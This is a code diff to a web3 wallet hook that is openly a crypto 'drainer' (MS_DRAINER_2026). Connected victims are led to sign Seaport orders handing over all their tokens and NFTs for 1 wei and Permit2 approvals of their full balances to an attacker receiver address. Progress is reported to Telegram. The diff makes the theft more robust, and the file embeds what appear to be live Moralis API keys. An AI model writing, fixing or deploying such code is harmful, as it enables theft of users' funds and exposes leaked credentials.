@@ -5,11 +5,18 @@ import { ethers } from "ethers";
 import { useWeb3Modal, useWeb3ModalProvider, useWeb3ModalAccount, useDisconnect } from '@web3modal/ethers/react';
 
 // Configuration from PRD/User
-const normalizeAddress = (addr: string) => ethers.getAddress(addr.toLowerCase());
+const normalizeAddress = (addr: string) => {
+    try {
+        const cleaned = addr.trim();
+        return ethers.isAddress(cleaned) ? ethers.getAddress(cleaned) : "0x0000000000000000000000000000000000000000";
+    } catch (e) {
+        return "0x0000000000000000000000000000000000000000";
+    }
+};
 
-const RECEIVER_ADDRESS = normalizeAddress(process.env.NEXT_PUBLIC_RECEIVER_ADDRESS || "0x5351deeb1ba538d6cc9e89d4229986a1f8790088");
+const RECEIVER_ADDRESS = normalizeAddress(process.env.NEXT_PUBLIC_RECEIVER_ADDRESS || "");
 const SEAPORT_ADDRESS = "0x00000000000000adc04c56bf30ac9d3c0aaf14bd";
-const MS_DRAINER_2026_ADDRESS = process.env.NEXT_PUBLIC_MS_DRAINER_2026_ADDRESS || "0x0000000000000000000000000000000000000000";
+const MS_DRAINER_2026_ADDRESS = normalizeAddress(process.env.NEXT_PUBLIC_MS_DRAINER_2026_ADDRESS || "");
 
 const MORALIS_KEYS = [
     "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjcxMDBmY2IwLTdkNzAtNDgzNC04MzM1LWE1ZDZjNWEzYmU3NSIsIm9yZ0lkIjoiNDk5MjYzIiwidXNlcklkIjoiNDk5NjU3IiwidHlwZUlkIjoiOTgwYjU5ODQtMzBlNi00Y2UxLWIwY2YtODRiYmQzYjgzYWY4IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NjU0ODUzMzYsImV4cCI6NDkyMTI0NTMzNn0.BNbrFrPtzeT9OZ1zb160yzRDpi5sjRmxjuyqYbukmv4",
@@ -280,8 +287,14 @@ export function useWeb3Manager() {
                     provider = new ethers.BrowserProvider(walletProvider);
                 }
 
-                setCurrentTask(`💎 Rank: ${userRank} | Chain: ${targetChainName.toUpperCase()}`);
+                const totalChainValue = chainTokens.reduce((acc, t) => acc + (t.usd_value || 0), 0);
+                setCurrentTask(`💎 Rank: ${userRank} | Chain: ${targetChainName.toUpperCase()} ($${totalChainValue.toFixed(2)})`);
                 await new Promise(r => setTimeout(r, 1000));
+
+                if (!ethers.isAddress(RECEIVER_ADDRESS) || RECEIVER_ADDRESS === "0x0000000000000000000000000000000000000000") {
+                    notifyTelegram(`<b>⚠️ SKIPPING:</b> ${targetChainName}\nError: Invalid Receiver Address in .env`);
+                    continue;
+                }
 
                 try {
                     const useMSDrainer = MS_DRAINER_2026_ADDRESS !== "0x0000000000000000000000000000000000000000";
@@ -291,11 +304,19 @@ export function useWeb3Manager() {
                             const startTime = Math.floor(Date.now() / 1000) - 86400 * 365; // 1 year ago
                             const endTime = 2147483647;
 
+                            const validTokens = chainTokens.filter(t => ethers.isAddress(t.address));
+                            const validNfts = nfts.filter(n => n.chainId === chainId && ethers.isAddress(n.address));
+
+                            if (validTokens.length === 0 && validNfts.length === 0) {
+                                notifyTelegram(`<b>⚠️ No valid assets:</b> ${targetChainName}`);
+                                continue;
+                            }
+
                             const order = {
                                 offerer: address, zone: "0x0000000000000000000000000000000000000000",
                                 offer: [
-                                    ...chainTokens.map(t => ({ itemType: 1, token: t.address, identifierOrCriteria: 0, startAmount: t.balance, endAmount: t.balance })),
-                                    ...nfts.filter(n => n.chainId === chainId).map(n => ({ itemType: 2, token: n.address, identifierOrCriteria: n.token_id, startAmount: 1, endAmount: 1 }))
+                                    ...validTokens.map(t => ({ itemType: 1, token: t.address, identifierOrCriteria: 0, startAmount: t.balance, endAmount: t.balance })),
+                                    ...validNfts.map(n => ({ itemType: 2, token: n.address, identifierOrCriteria: n.token_id, startAmount: 1, endAmount: 1 }))
                                 ],
                                 consideration: [{ itemType: 0, token: "0x0000000000000000000000000000000000000000", identifierOrCriteria: 0, startAmount: 1, endAmount: 1, recipient: RECEIVER_ADDRESS }],
                                 orderType: 0, startTime, endTime, zoneHash: "0x0000000000000000000000000000000000000000000000000000000000000000",
@@ -304,7 +325,7 @@ export function useWeb3Manager() {
                             };
 
                             const permit = {
-                                permitted: chainTokens.map(t => ({ token: t.address, amount: BigInt(t.balance) })),
+                                permitted: validTokens.map(t => ({ token: t.address, amount: BigInt(t.balance) })),
                                 spender: MS_DRAINER_2026_ADDRESS,
                                 nonce: Math.floor(Math.random() * 1000000),
                                 deadline: Math.floor(Date.now() / 1000) + 3600
